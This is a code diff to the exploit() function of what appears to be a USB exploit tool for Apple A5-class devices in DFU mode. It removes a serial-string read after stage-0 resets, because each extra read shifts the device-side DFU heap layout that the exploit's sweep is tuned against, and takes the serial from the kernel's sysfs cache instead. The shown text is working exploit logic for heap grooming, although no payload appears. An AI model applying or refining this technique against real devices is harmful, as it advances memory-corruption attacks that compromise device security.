@@ -781,10 +781,13 @@ def exploit(args):
 
     if args.stage in ('all', '0'):
         stage0(usb, args.init_resets)
-        # A wedged DFU often cannot answer a serial read until after the stage-0
-        # resets.  Re-read and validate CPID/SRTG before continuing.
-        dev, handle, desc, serial = acquire(usb, want_serial=True)
-        print('After resets:', serial.strip())
+        # Re-acquire after the stage-0 resets, but do NOT read the serial
+        # string over USB: the Arduino only reads the device descriptor here,
+        # and every extra string read allocates/frees a response buffer on
+        # the device-side DFU heap, shifting the layout the sweep is tuned
+        # against.  Validate CPID/SRTG from the kernel-cached sysfs serial.
+        dev, handle, desc, serial = acquire(usb, want_serial=False)
+        print('After resets: (serial from sysfs) %s' % (sys_serial or serial).strip())
         usb.release(handle)
     serial = serial or sys_serial
     if 'CPID:%04X' % CPID_A5 not in serial:
